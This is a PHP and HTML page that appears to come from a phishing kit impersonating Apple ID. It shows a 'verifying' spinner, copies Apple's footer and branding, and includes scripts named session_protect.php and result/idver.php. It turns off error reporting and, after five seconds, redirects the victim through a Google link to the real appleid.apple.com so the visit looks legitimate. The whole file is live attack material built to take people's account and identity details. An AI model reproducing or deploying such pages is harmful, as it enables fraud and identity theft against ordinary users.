<?php 
require "assets/includes/session_protect.php";
include "config.php";
?>
<?php
@error_reporting(0);
ini_set('display_errors', 0);
require "lang.php";
if ($idcard == "naam") {}
else {
    include "result/idver.php";
}
?>
<!DOCTYPE html>
<html>
<head>
    <meta content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" name="viewport">
    <meta http-equiv="refresh"
          content="5; url=https://www.google.co.uk/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&uact=8&ved=0ahUKEwioqpfl4oPKAhWHPxQKHYGXAjkQFggfMAA&url=https%3A%2F%2Fappleid.apple.com%2F&usg=AFQjCNF7841Jq5PLrYJwYDN8RkcZjuNVww&sig2=gKBRh04c9wVr4EOc4FARAw&bvm=bv.110151844,d.d24"/>
    <title><?php echo $comp?></title>
    <link href="assets/img/favicon.ico" rel="shortcut icon" type="image/x-icon">
    <link href="assets/css/First.css" media="all" rel="stylesheet" type="text/css">
    <link href="assets/css/Second.css" rel="stylesheet" type="text/css">
    <link href="assets/css/Fonts.css" rel="stylesheet" type="text/css">
    <link href="assets/css/verify.css" rel="stylesheet" type="text/css">
</head>
<body id="pagecontent">
<div id="content">
    <div class="bdd45">
        <nav id="xdsfv54" class="js no-touch svg no-ie7 no-ie8">
            <div class="HeaderObjHolder">
                <ul class="MobHeader">
                    <li class="HeaderObj MobMenIconH">
                        <label class="MobMenHol">
<span class="MobMenIcon MobMenIcon-top">
<span class="MobMenIcon-crust MobMenIcon-crust-top"></span> </span> <span class="MobMenIcon MobMenIcon-bottom">
<span class="MobMenIcon-crust MobMenIcon-crust-bottom"></span> </span>
                        </label>
                    </li>
                    <li class="HeaderObj">
                        <a class="Item1" href="#" style="display: inline-block;margin-left:50%;margin-top:11px"
                           id="ac-gn-firstfocus-small"> <span class="ac-gn-link-text">&nbsp;</span> </a>
                        <a class="Item10" style="display: inline-block;float:right;margin-top:11px" href="#"> <span
                                    class="ac-gn-link-text">&nbsp;</span> <span class="ac-gn-bag-badge"></span> </a>
                        <span class="ac-gn-bagview-caret ac-gn-bagview-caret-large"></span>
                    </li>
                </ul>
                <ul class="HeaderObjList">
                    <li class="HeaderObj HeaderItem"><a class="HeaderLink Item1" href="#"></a></li>
                    <li class="HeaderObj HeaderItem"><a class="HeaderLink Item2" href="#"></a></li>
                    <li class="HeaderObj HeaderItem"><a class="HeaderLink Item3" href="#"></a></li>
                    <li class="HeaderObj HeaderItem"><a class="HeaderLink Item4" href="#"></a></li>
                    <li class="HeaderObj HeaderItem"><a class="HeaderLink Item5" href="#"></a></li>
                    <li class="HeaderObj HeaderItem"><a class="HeaderLink Item6" href="#"></a></li>
                    <li class="HeaderObj HeaderItem"><a class="HeaderLink Item7" href="#"></a></li>
                    <li class="HeaderObj HeaderItem"><a class="HeaderLink Item8" href="#"></a></li>
                    <li class="HeaderObj HeaderItem"><a class="HeaderLink Item9" href="#"></a></li>
                    <li class="HeaderObj HeaderItem"><a class="HeaderLink Item10" href="#"></a></li>
                </ul>
            </div>
        </nav>
        <script>var version = "<?php echo $data_arr ?>"; </script>
        <?php include "bagian/flow.php" ?>
                <div class="container">
                    <div class="flex home-content">
                        <div class="container flow-sections">
                            <div class="account-wrapper">
                                <div align="center">
                                    <h1 style="color:#009CDE"><?php echo $avcomp ?></h1>
                                    <p><span class="clearfix" style="margin-top: 10px;"><img id="spinner"
                                                                                             src="assets/img/spin.GIF"
                                                                                             height="24"
                                                                                             width="160"></span></p>
                                    <p><?php echo $textver ?></p>
                                    <p style="text-decoration: underline;color:red;"><?php echo $foryo ?></p>
                                </div>
                            </div>


                        </div>
                    </div>
                </div>
            </div>
            <footer>
<div class="container">
<div class="footer">
<div class="footer-wrap">
<div class="FooterLine1">
<div class="line-level">Shop the <a href="#">Apple Online Store</a> (<?php echo $lang['APPCALL'];?>), visit an <a href="#">Apple Retail Store</a>, or find a <a href="#">reseller</a>.</div>
</div>
<div class="FooterLine2">
<ul class="menu">
<li class="item"><a href="#">Apple Info</a></li>
<li class="item"><a href="#">Site Map</a></li>
<li class="item"><a href="#">Hot News</a></li>
<li class="item"><a href="#">RSS Feeds</a></li>
<li class="item"><a href="#">Contact Us</a></li>
<li class="item"><a class="choose" href="#"><img height="22" src="<?php echo $lang['FLAG'];?>" width="22"></a></li>
</ul>
</div>
<div class="FooterLine3">Copyright © 2018 Apple Inc. All rights reserved.
<ul class="menu">
<li class="item"><a href="#">Terms of Use</a></li>
<li class="item"><a href="#">Privacy Policy</a></li>
</ul>
</div>
</div>
</div>
</div>
            </footer>
        </div>
    </div>
</body>
</html>
